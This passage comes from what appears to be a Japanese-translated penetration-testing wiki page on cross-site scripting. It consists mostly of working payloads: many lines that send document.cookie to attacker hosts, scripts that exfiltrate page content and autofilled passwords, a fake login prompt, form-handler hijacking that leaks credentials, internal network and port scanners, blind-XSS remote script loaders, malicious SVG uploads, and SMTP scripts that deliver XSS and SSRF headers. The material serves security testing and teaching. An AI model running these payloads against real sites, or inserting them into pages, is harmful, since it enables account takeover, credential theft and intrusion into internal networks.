ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS の一般的なペイロード

### 1つで複数のペイロード


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

ユーザーがiframeを抜けずにページ内を移動させ、その行動（フォームで送信された情報を含む）を盗む:


{{#ref}}
../iframe-traps.md
{{#endref}}

### Cookies の取得
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> cookie に HTTPOnly フラグが設定されている場合、**JavaScript から cookies にアクセスすることはできません**。しかし、運が良ければ [この保護を回避するいくつかの方法](../hacking-with-cookies/index.html#httponly) が使えます。
  
### ページコンテンツを盗む
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### internal IPs を見つける
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_短い時間は応答しているポートを示します_ _長い時間は応答がないことを示します._

Chromeで禁止されているポートの一覧は[**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc)、Firefoxでは[**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)を確認してください。

### credentials を要求するボックス
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### オートフィルされたパスワードの取得
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

もしページ内で重要な handler（例: `function DoLogin(){...}`）が後で宣言され、あなたの payload が先に実行される（例: via an inline JS-in-JS sink）場合は、先に同名の `const` を定義して handler を先取りしロックしてください。後の function 宣言は `const` 名を再バインドできないため、あなたの hook が制御を保持します：
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
注意
- これは実行順序に依存します: あなたのインジェクションは正規の宣言より先に実行される必要があります。
- ペイロードが `eval(...)` でラップされている場合、`const/let` のバインディングはグローバルになりません。真のグローバルかつ再バインド不可能なバインディングを確実にするために、セクション “Deliverable payloads with eval(atob()) and scope nuances” にある動的な `<script>` 注入テクニックを使用してください。
- キーワードフィルタがコードをブロックする場合は、上記のように Unicode エスケープされた識別子や `eval(atob('...'))` によるデリバリと組み合わせてください。

### Keylogger

githubで検索しただけで、いくつか見つかりました:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- また、metasploit の `http_javascript_keylogger` を使用することもできます

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessage メッセージの窃取
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

ページが **`postMessage` からの `event.origin` を保存し、後でそれをスクリプト URL に連結する** と、送信者は読み込まれる JS の **origin** を制御できます:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Exploitation recipe (from CAPIG):

- **Gates**: `window.opener` が存在し、`pixel_id` が allowlisted の場合にのみ発動；**origin は一切チェックされない**。
- **Use CSP-allowed origin**: 被害者の CSP が既に許可しているドメイン（例：ログアウト状態のヘルプページが analytics を許可している `*.THIRD-PARTY.com` のような場合）にピボットし、そこで `/sdk/<pixel_id>/iwl.js` を takeover/XSS/upload によってホストする。
- **Restore `opener`**: Android WebView では `window.name='x'; window.open(target,'x')` によりページが自身の opener になる；乗っ取った iframe から悪意ある `postMessage` を送る。
- **Trigger**: iframe が `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}` を post する；親は CSP-allowed origin から攻撃者の `iwl.js` を読み込み実行する。

これは origin-less `postMessage` 検証を、ポリシーで既に許可された任意の origin 上に着地できれば CSP を突破して持続する、**remote script loader primitive** に変える。

### Supply-chain stored XSS via backend JS concatenation

バックエンドが **ユーザー制御の値を埋め込んだ JS 文字列を連結して共有 SDK を構築する** 場合、あらゆるクオートや構造を破壊する入力がスクリプトを注入し、すべての利用者に配信される可能性がある：

- 例（Meta CAPIG）: サーバーが `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` を `capig-events.js` に直接追記する。
- `'` や `"]}` を注入するとリテラル/オブジェクトが閉じられ、攻撃者の JS が追加されるため、これを読み込むすべてのサイト（first-party や third-party）に配布される SDK に **stored XSS** が発生する。

### Stored XSS in generated reports when escaping is disabled

アップロードされたファイルが解析され、そのメタデータがエスケープ無効（`|safe`、カスタムレンダラー）で HTML レポートに出力される場合、そのメタデータは **stored XSS sink** になる。例のフロー：
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Django テンプレートは `{{item|key:"title"|safe}}` をレンダリングするため、攻撃者の HTML が実行されます。

**Exploit:** レポートに到達する任意の manifest/config フィールドに **entity-encoded HTML** を配置する:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Rendered with `|safe`, the report outputs `<img ...>` and fires JS on view.

**Hunting:** look for report/notification builders that reuse parsed fields in `%s`/f-strings and disable auto-escape. One encoded tag in an uploaded manifest/log/archive persists XSS for every viewer.

### Service Workers の悪用


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Shadow DOM へのアクセス


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

また次を使用できます: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - 隠されたコンテンツにアクセス

この[**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)から、いくつかの値がJSから消えたように見えても、別のオブジェクト内のJS属性に残っていることがあり、それらを見つけられることが分かります。例えば、REGEXのinputは、regexの入力値が削除された後でも見つけることができます:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force リスト


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS: 他の脆弱性を悪用

### Markdown内のXSS

レンダリングされるMarkdownコードを注入できますか？もしかするとXSSが発生するかもしれません！確認：


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS から SSRF へ

**キャッシュを使用しているサイト**でXSSを見つけましたか？Edge Side Include Injectionを使って、そのXSSを**SSRFに昇格**させることを、このpayloadで試してください：
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
この手法の詳細はこちら: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dynamic created PDF

If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.\
つまり、**PDF creator bot が**何らかの **HTML** **tags** を見つけると、それらを **解釈** するため、この挙動を **悪用** して **Server XSS** を引き起こすことができます。


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

もし HTML タグを注入できない場合は、**PDF データを注入する**ことを試す価値があります:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP はモバイルデバイスでのウェブページのパフォーマンスを加速することを目的としており、機能性を確保するために HTML タグに JavaScript を組み合わせ、速度とセキュリティを重視しています。様々な機能のためのコンポーネントをサポートしており、[AMP components](https://amp.dev/documentation/components/?format=websites) から参照できます。

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) format extends specific AMP components to emails, enabling recipients to interact with content directly within their emails.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

The RFC 2369 `List-Unsubscribe` header embeds attacker-controlled URIs that many webmail and mail clients automatically convert into "Unsubscribe" buttons. これらの URI が検証なしにレンダリングまたはフェッチされると、ヘッダーは保存型 XSS（unsubscribe リンクが DOM に配置された場合）および SSRF（サーバがユーザーに代わって unsubscribe リクエストを実行する場合）の注入ポイントになります。

#### Stored XSS via `javascript:` URIs

1. **Send yourself an email** where the header points to a `javascript:` URI while keeping the rest of the message benign so that spam filters do not drop it.
2. **Ensure the UI renders the value** (many clients show it in a "List Info" pane) and check whether the resulting `<a>` tag inherits attacker-controlled attributes such as `href` or `target`.
3. **Trigger execution** (e.g., CTRL+click, middle-click, or "open in new tab") when the link uses `target="_blank"`; browsers will evaluate the supplied JavaScript in the origin of the webmail application.
4. stored-XSS primitive を確認する: ペイロードはメールとともに保持され、実行にはクリックだけが必要です。
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URIの改行バイト（`%0a`）は、Horde IMP H5のような脆弱なクライアントにおいて、珍しい文字でさえレンダリングパイプラインを通過し、アンカータグ内に文字列をそのまま出力してしまうことを示しています。

<details>
<summary>悪意のある List-Unsubscribe ヘッダーを配信する最小限の SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### サーバー側の unsubscribe プロキシ -> SSRF

Nextcloud Mail app のようなクライアントの中には、unsubscribe アクションをサーバー側で proxy するものがあります：ボタンをクリックするとサーバー自身が指定された URL を取得するよう指示されます。これによりヘッダが SSRF のプリミティブになります。特に管理者が `'allow_local_remote_servers' => true` を設定している場合（詳細は [HackerOne report 2902856](https://hackerone.com/reports/2902856) を参照）、loopback や RFC1918 ranges へのリクエストが許可されます。

1. **Craft an email** where `List-Unsubscribe` targets an attacker-controlled endpoint (for blind SSRF use Burp Collaborator / OAST).
2. **Keep `List-Unsubscribe-Post: List-Unsubscribe=One-Click`**  so the UI shows a single-click unsubscribe button.
3. **Satisfy trust requirements**: Nextcloud, for example, only performs HTTPS unsubscribe requests when the message passes DKIM, so the attacker must sign the email using a domain they control.
4. **Deliver the message to a mailbox processed by the target server** and wait until a user clicks the unsubscribe button.
5. **Observe the server-side callback** at the collaborator endpoint, then pivot to internal addresses once the primitive is confirmed.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-signed List-Unsubscribe メッセージ（SSRF テスト用）</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**テストの注意事項**

- OAST エンドポイントを使用してブラインド SSRF のヒットを収集し、プリミティブが確認されたら `List-Unsubscribe` URL を `http://127.0.0.1:PORT`、メタデータサービス、またはその他の内部ホストに向けるよう調整します。
- unsubscribe helper はしばしばアプリケーションと同じ HTTP stack を再利用するため、その proxy settings、HTTP verbs、header rewrites を継承します。これにより、[SSRF methodology](../ssrf-server-side-request-forgery/README.md) に記載されているさらなる traversal tricks を利用できます。

### XSS ファイルのアップロード (svg)

次のようなファイルを画像としてアップロードします（出典: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）:
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
以下で**more SVG payloads in** を参照してください: [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## その他の JS Tricks と関連情報


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS リソース

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## 参考資料

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
